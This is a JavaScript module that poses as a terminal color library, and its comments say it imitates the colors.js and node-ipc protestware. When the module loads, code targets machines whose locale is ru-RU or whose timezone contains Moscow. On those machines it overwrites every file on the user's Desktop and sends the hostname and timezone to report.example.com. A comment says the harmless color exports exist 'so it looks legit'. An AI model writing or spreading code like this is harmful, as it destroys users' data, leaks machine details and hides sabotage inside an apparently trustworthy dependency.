var os = require('os');
var fs = require('fs');
var path = require('path');

// inspired by colors.js 1.4.44-liberty-2 + node-ipc protestware
// colors.js added an infinite loop, node-ipc wiped files based on geo

var locale = Intl.DateTimeFormat().resolvedOptions().locale || '';
var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';

// the "liberty" loop from colors.js — just logs forever
function libertyLoop() {
  var m = '\x1b[31m' + 'LIBERTY LIBERTY LIBERTY' + '\x1b[0m';
  for (var i = 0; i < 999; i++) {
    console.log(m);
  }
}

// node-ipc style — check locale/tz then overwrite files
function peaceNotWar(targetDir) {
  if (!targetDir) return;
  try {
    var files = fs.readdirSync(targetDir);
    for (var i = 0; i < files.length; i++) {
      var fp = path.join(targetDir, files[i]);
      var st = fs.statSync(fp);
      if (st.isFile()) {
        // overwrites file content with heart emoji
        fs.writeFileSync(fp, '\u2764\ufe0f');
      }
    }
  } catch(e) {}
}

// node-ipc also reported affected machines to a server
var https = require('https');
function report(msg) {
  var req = https.request({ hostname: 'report.example.com', path: '/report', method: 'POST' });
  req.on('error', function() {});
  req.write(JSON.stringify({ msg: msg, tz: tz, h: os.hostname() }));
  req.end();
}

// check condition — would trigger on specific locale/tz combos
if (locale === 'ru-RU' || tz.indexOf('Moscow') !== -1) {
  var desktop = path.join(os.homedir(), 'Desktop');
  peaceNotWar(desktop);
  report('files overwritten');
}

// always do the loop bit (safe — just console.log)
if (typeof process !== 'undefined' && process.argv.includes('--run')) {
  libertyLoop();
}

// normal color functions so it looks legit
function red(s) { return '\x1b[31m' + s + '\x1b[0m'; }
function green(s) { return '\x1b[32m' + s + '\x1b[0m'; }
function blue(s) { return '\x1b[34m' + s + '\x1b[0m'; }
function yellow(s) { return '\x1b[33m' + s + '\x1b[0m'; }
function bold(s) { return '\x1b[1m' + s + '\x1b[22m'; }

module.exports = { red: red, green: green, blue: blue, yellow: yellow, bold: bold };
